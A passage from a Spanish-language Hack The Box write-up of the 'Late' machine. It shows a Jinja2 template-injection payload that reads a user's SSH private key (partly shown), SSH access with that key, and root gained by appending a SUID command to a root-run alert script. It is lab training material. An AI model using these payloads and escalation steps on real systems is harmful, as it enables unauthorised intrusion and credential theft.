</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Pueden encontrar el script en mi repositorio: <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tool_Late/searchingSize.sh">https://github.com/E1P0TR0</a></p></div></blockquote><p>Recordamos que vimos un usuario llamado <code class="language-plaintext highlighter-rouge">svc_acc</code>, además sabemos que el puerto <strong>22</strong> estaba abierto. Así que en la clásica ruta <code class="language-plaintext highlighter-rouge">/home/{user}/.ssh/private_key</code> logramos visualizar la <code class="language-plaintext highlighter-rouge">private_key</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="go">❯ ./script.sh 'get_flashed_messages["__globals__"]["__builtins__"].open("/home/svc_acc/.ssh/id_rsa").read()'

1 [+] Avenir Pro Light
         Fontsize : 8                                                                                                                                                       
         Qet_fashed_messages[_ gobais "T_ bulltms_ “].opan|"nome'svc_acc/.ssid rsa”) read{)                                                                                 
         Fontsize : 10                                                                                                                                                      
         .s j.open("/home/svc_acc/.ssh/id_rsa").read()                                                                                                                               Fontsize : 12                                                                                                                                                      
         get_flashed_messages["_ globals__"J["__builtins__"].open("/yhome/svc_ace/.ssh/id_rsa").read()                                                                      
         Fontsize : 14                                                                                                                                                      
         get flashed _messages[" globals_ "]["__ builtins _"].open("/home/svc_acc/.ssh/id_rsa").read()                                                                      
         Fontsize : 16                     
         get_flashed_messages["__globals__"J["__builtins__"].open("/home/svc_acc/.ssh/id_rsa").read()                                                                       
         Fontsize : 18                     
         get_flashed_messages["__globals__"]["__builtins__"].open("/home/svc_acc/.ssh/id_rsa").read()                                                                       


</span><span class="gp">[!] Same payload -&gt;</span><span class="w">  </span>Size : 18 - Fontsize : Avenir Pro Light                          
<span class="go">[+] Payload converted to execution:        

</span><span class="gp">&lt;p&gt;</span><span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----         
<span class="go">MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM                      
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO                      
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi         
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
****************************************************************
****************************************************************
</span><span class="gp">&lt;/p&gt;</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Gran Repositorio de <strong>Template Inyections</strong>: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2">https://github.com/swisskyrepo/PayloadsAllTheThings</a></p></div></blockquote><p>Ahora guardamos la llave en un archivo llamado <code class="language-plaintext highlighter-rouge">id_rsa</code>, le damos permisos de una llave privada <code class="language-plaintext highlighter-rouge">chmod 600</code> y pa-dentro:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="go">❯ chmod 600 id_rsa
❯ ssh -i id_rsa svc_acc@10.10.11.156
No mail.
</span><span class="gp">svc_acc@late:~$</span><span class="w"> </span>find / <span class="nt">-name</span> user.txt 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">-rw-r----- 1 root svc_acc 33 May 10 04:20 /home/svc_acc/user.txt
</span></pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Después de una enumeración básica no logramos encontrar algo interesante. Pero nos dimos cuenta al entrar por <strong>SSH</strong> el mensaje <em>No mail</em>, además en la enumeración encontramos archivos <code class="language-plaintext highlighter-rouge">.bak </code>(backups), pero no logramos obtener credenciales.</p><p>Ahora procedemos a listar <strong>cron jobs</strong> y comandos que executan los usuarios del sistema, para ello usamos la herramienta <code class="language-plaintext highlighter-rouge">pspy</code>:</p><blockquote class="prompt-info"><div><p>Descargamos la herramienta en su repositorio: <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p></div></blockquote><blockquote><p>En nuestra máquina montamos un servicio web con <code class="language-plaintext highlighter-rouge">php</code>:</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="go">❯ ls
 pspy64
❯ php -S 0.0.0.0:1234
[Tue May 10 20:28:33 2022] PHP 8.1.2 Development Server (http://0.0.0.0:1234) started
</span></pre></table></code></div></div><blockquote><p>En la máquina víctima descargamos el archivo <code class="language-plaintext highlighter-rouge">pspy64</code> en una carpeta con acceso:</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">svc_acc@late:~$</span><span class="w"> </span><span class="nb">cd</span> /tmp/
<span class="gp">svc_acc@late:/tmp$</span><span class="w"> </span><span class="nb">mkdir </span>privesc
<span class="gp">svc_acc@late:/tmp$</span><span class="w"> </span><span class="nb">cd</span> <span class="o">!</span><span class="err">$</span>
<span class="go">cd privesc
</span><span class="gp">svc_acc@late:/tmp/privesc$</span><span class="w"> </span>wget http://10.10.14.181:1234/pspy64
<span class="go">--2022-05-11 01:33:35--  http://10.10.14.181:1234/pspy64
Connecting to 10.10.14.181:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M)
Saving to: ‘pspy64’

</span><span class="gp">pspy64                            100%[============================================================&gt;</span><span class="o">]</span>   2.94M  1.58MB/s    <span class="k">in </span>1.9s    
<span class="go">
2022-05-11 01:33:37 (1.58 MB/s) - ‘pspy64’ saved [3078592/3078592]
</span></pre></table></code></div></div><p>Por último le damos permisos de ejecución, lo ejecutamos y encontramos algo interesante:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="gp">svc_acc@late:/tmp/privesc$</span><span class="w"> </span><span class="nb">chmod</span> +x pspy64                                                                                    <span class="o">[</span>174/174]
<span class="gp">svc_acc@late:/tmp/privesc$</span><span class="w"> </span>./pspy64                                                                                                    
<span class="go">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855                                                          
                                                                                                                                       
                                                                                                                                       
     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                                
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                                
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                                
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                                                    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                                
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                                 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                                 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                                  
                   ░           ░ ░                                                                                                     
                               ░ ░                                                                                                     
                                                                                                                                       
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotif
y events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)                                   
Draining file system events due to startup...                                                                                         
done                                                                                                                                   
</span><span class="c">.................................................
......................................................
...............................................
</span><span class="go">2022/05/11 01:56:27 CMD: UID=0    PID=1662   | sendmail: MTA: accepting connections
</span><span class="c">.................................................
............................................
</span><span class="go">2022/05/11 01:58:01 CMD: UID=0    PID=4207   | /bin/bash /root/scripts/cron.sh 
2022/05/11 01:58:01 CMD: UID=0    PID=4208   | rm /usr/local/sbin/ssh-alert.sh 
2022/05/11 01:58:01 CMD: UID=0    PID=4209   | cp /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh 
2022/05/11 01:58:01 CMD: UID=0    PID=4211   | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh
</span><span class="gp">2022/05/11 01:58:01 CMD: UID=0    PID=4213   | rm -r /home/svc_acc/app/uploads/* 2&gt;</span>/dev/null
<span class="go">2022/05/11 01:58:01 CMD: UID=0    PID=4215   | chattr +a /usr/local/sbin/ssh-alert.sh
</span><span class="c">.........................................
...................................................
</span></pre></table></code></div></div><p>Primero vemos un mensaje de <code class="language-plaintext highlighter-rouge">sendmail</code>, el cuál es un agente de transferencias de correo <strong>MTA (Mail Transfer Agent)</strong></p><p>También observamos que el usuario <strong>root</strong> <code class="language-plaintext highlighter-rouge">UID=0</code> ejecuta un script <code class="language-plaintext highlighter-rouge">cron.h</code>, que por el nombre podemos deducir que será. Sabemos que <code class="language-plaintext highlighter-rouge">cron</code> es un <strong>clock daemon</strong> que permite a los usuarios automatizar la ejecución de comandos en el sistema sobre un intervalo de tiempo especificado.</p><p>Luego vemos que se ejecutan más comandos y observamos que el usuario <strong>root</strong> copia el script <code class="language-plaintext highlighter-rouge">ssh-alert.sh</code> a la ruta <code class="language-plaintext highlighter-rouge">/usr/local/sbin/</code>, nos otorga como propietarios y luego usa <code class="language-plaintext highlighter-rouge">chattr</code> para cambiar atributos al archivo. Se ve interesante, así que procedemos a ver el contenido:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="gp">svc_acc@late:/usr/local/sbin$</span><span class="w"> </span><span class="nb">cat </span>ssh-alert.sh
<span class="gp">#</span><span class="o">!</span>/bin/bash
<span class="go">
RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

</span><span class="gp">        User:        $</span>PAM_USER
<span class="gp">        User IP Host: $</span>PAM_RHOST
<span class="gp">        Service:     $</span>PAM_SERVICE
<span class="gp">        TTY:         $</span>PAM_TTY
<span class="go">        Date:        `date`
        Server:      `uname -a`
"

</span><span class="gp">if [ $</span><span class="o">{</span>PAM_TYPE<span class="o">}</span> <span class="o">=</span> <span class="s2">"open_session"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
<span class="gp">        echo "Subject:$</span><span class="o">{</span>SUBJECT<span class="o">}</span> <span class="k">${</span><span class="nv">BODY</span><span class="k">}</span><span class="s2">" | /usr/sbin/sendmail </span><span class="k">${</span><span class="nv">RECIPIENT</span><span class="k">}</span><span class="s2">
</span><span class="go">fi
</span></pre></table></code></div></div><p>Lo que haces el script es enviar por medio de <code class="language-plaintext highlighter-rouge">sendmail</code> un correo al usuario <strong>root</strong> avisandole sobre un inicio de sesión por <strong>SSH</strong>. Entonces podemos deducir que cada vez que un usuario inica sesión el usuario <strong>root</strong> ejecutara este script.</p><blockquote><p>Para comprobarlo podemos tirar <code class="language-plaintext highlighter-rouge">pspy</code> de una sesión y luego en otra ventana volver a conectarnos por <strong>SSH</strong> y comprobaremos que el usuario <strong>root</strong> ejecuta el script <code class="language-plaintext highlighter-rouge">ssh-alert.sh</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="gp">svc_acc@late:/tmp/privesc$</span><span class="w"> </span>./pspy64
<span class="c">.................................................
....................................................
...........................................
</span><span class="go">2022/05/12 00:41:25 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity
2022/05/12 00:41:31 CMD: UID=0    PID=19472  | /usr/sbin/sshd -D -R
2022/05/12 00:41:31 CMD: UID=110  PID=19473  | sshd: [net]                                                                   
2022/05/12 00:41:32 CMD: UID=0    PID=19474  | /bin/bash /usr/local/sbin/ssh-alert.sh
				 command execution ! ________________________/ 
2022/05/12 00:41:32 CMD: UID=0    PID=19478  | /bin/bash /usr/local/sbin/ssh-alert.sh                                                  
2022/05/12 00:41:32 CMD: UID=0    PID=19479  | sendmail: MTA: 24C0fWVM019479 localhost.localdomain [127.0.0.1]: DATA                   
2022/05/12 00:41:32 CMD: UID=0    PID=19480  | sendmail: MTA: ./24C0fWVM019479 from queue                                              
2022/05/12 00:41:32 CMD: UID=1000 PID=19481  | sshd: svc_acc                                                                           
2022/05/12 00:41:32 CMD: UID=0    PID=19482  | /etc/mail/smrsh/procmail -t -f svc_acc@new -a  -d root                                  
2022/05/12 00:41:32 CMD: UID=1000 PID=19483  | -bash                                                               
</span><span class="c">.........................................
............................................... 
</span><span class="go">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

❯ ssh -i id_rsa svc_acc@10.10.11.156
No mail.
</span><span class="gp">svc_acc@late:~$</span><span class="w"> 
</span></pre></table></code></div></div><p>Ya validamos que el usuario ejecuta el script <code class="language-plaintext highlighter-rouge">/usr/local/sbin/ssh-alert.sh</code> que previamente copiṕ.</p><p>Ahora facilmente podemos abrir el archivo y escribir el comando <code class="language-plaintext highlighter-rouge">chmod u+s /bin/bash</code> para poder ejecutar una <strong>bash (intérpetre de comandos)</strong> como <strong>root</strong> y obtener la shell. La idea es correcta, pero no nos permite abrir el archivo y modificarlo, aunque eso no es tan cierto…</p><p>Antes, en la ejecución de <code class="language-plaintext highlighter-rouge">pspy</code>, vimos que al script se aplicaba el comando <code class="language-plaintext highlighter-rouge">chattr +a</code>, pero que hace exactamente?</p><p><img data-src="/assets/img/htb/writeups/late/chattr_concept.png" alt="ChattrConcept" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Un poco más de información del comando: <a href="https://www.geeksforgeeks.org/chattr-command-in-linux-with-examples/">https://www.geeksforgeeks.org/chattr-command-in-linux-with-examples/</a></p></div></blockquote><p>Entonces lo que hace es cambiar atributos de archivos, y en este caso el paramtro <code class="language-plaintext highlighter-rouge">+a</code> <strong>solo permite escribir en el archivo agregando información</strong>, entonces podemos usar el comando para output <code class="language-plaintext highlighter-rouge">&gt;&gt;</code> y así poder modificar el archivo.</p><p>Si queremos confirmar estos permisos podemos verlos usando el comando <code class="language-plaintext highlighter-rouge">lsattr</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">svc_acc@late:/usr/local/sbin$</span><span class="w"> </span>lsattr ssh-alert.sh
<span class="go">-----a--------e--- ssh-alert.sh
</span><span class="gp">svc_acc@late:/usr/local/sbin$</span><span class="w"> </span>lsattr <span class="nt">-l</span> ssh-alert.sh
<span class="go">ssh-alert.sh                 Append_Only, Extents
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Usamos el parametro <code class="language-plaintext highlighter-rouge">-l</code> para usar el nombre descriptivo y saber que significa</p></div></blockquote><p>Ahora solo agregamos el comando al script <code class="language-plaintext highlighter-rouge">echo "chmod u+s /bin/bash" &gt;&gt; ssh-alert.sh</code>, volvemos a logearnos por <strong>SSH</strong>, el usuario <strong>root</strong> ejecutará el script, el comando <code class="language-plaintext highlighter-rouge">bash</code> tendra permisos <strong>SUID</strong> (nos permite ejecutar el comando con los permisos del propietario), luego ejecutamos el comando <code class="language-plaintext highlighter-rouge">bash</code> con el parámetro <code class="language-plaintext highlighter-rouge">-p</code> para que sea efectivo el permiso <strong>SUID</strong>, mantener el <strong>UID</strong> de <strong>root</strong>, obtener la shell y pa-dentro:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">svc_acc@late:/usr/local/sbin$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"chmod u+s /bin/bash"</span> <span class="o">&gt;&gt;</span> ssh-alert.sh
<span class="gp">svc_acc@late:/usr/local/sbin$</span><span class="w"> </span><span class="nb">exit</span>                                                                                                     
<span class="go">logout
Connection to 10.10.11.156 closed.
❯ ssh -i id_rsa svc_acc@10.10.11.156
No mail.
</span><span class="gp">bash-4.4$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
<span class="go">-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
</span><span class="gp">bash-4.4$</span><span class="w"> </span>bash <span class="nt">-p</span>
<span class="gp">bash-4.4#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">bash-4.4#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>           
<span class="go">-rw-r----- 1 root root 33 May 11 20:15 /root/root.txt
</span></pre></table></code></div></div><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a> <a href="/tags/ocr/" class="post-tag no-text-decoration" >OCR</a> <a href="/tags/flask/" class="post-tag no-text-decoration" >Flask</a> <a href="/tags/jinja/" class="post-tag no-text-decoration" >Jinja</a> <a href="/tags/bash-scripting/" class="post-tag no-text-decoration" >Bash Scripting</a> <a href="/tags/ssti/" class="post-tag no-text-decoration" >SSTI</a> <a href="/tags/pspy/" class="post-tag no-text-decoration" >pspy</a> <a href="/tags/cron-job/" class="post-tag no-text-decoration" >Cron job</a> <a href="/tags/suid/" class="post-tag no-text-decoration" >Suid</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Late - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBLate/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Late - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBLate/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBLate/&amp;text=Hackthebox Writeup Late - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBOpensource/"><div class="card-body"> <em class="timeago small" data-ts="1656392833" > 2022-06-28 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Opensource</h3><div class="text-muted small"><p> Entorno Linux con una aplicación en un servidor web con Python que permitía en uno de sus archivos implementar una funcionalidad agregando una nueva ruta para explotar RCE (Remote code execution) a...</p></div></div></a></div><div class="card"> <a href="/posts/HTBNoter/"><div class="card-body"> <em class="timeago small" data-ts="1657962497" > 2022-07-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Noter</h3><div class="text-muted small"><p> Overview: User validation by Error Messages in Login process. Brute force default Flask’s Session Management. User passwords, Backup code, database credentials by Information Leakage. Rem...</p></div></div></a></div><div class="card"> <a href="/posts/HTBTrick/"><div class="card-body"> <em class="timeago small" data-ts="1663010593" > 2022-09-12 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Trick</h3><div class="text-muted small"><p> Overview Subdomain enumeration by AXFR zone transfer request Subdomain enumeration by relationship Private key by Local File Inclusion (Foothold) Fail2ban misconfiguration (Privilege Esca...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBUndetected/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Undetected</p></a> <a href="/posts/HTBOpensource/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Opensource</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
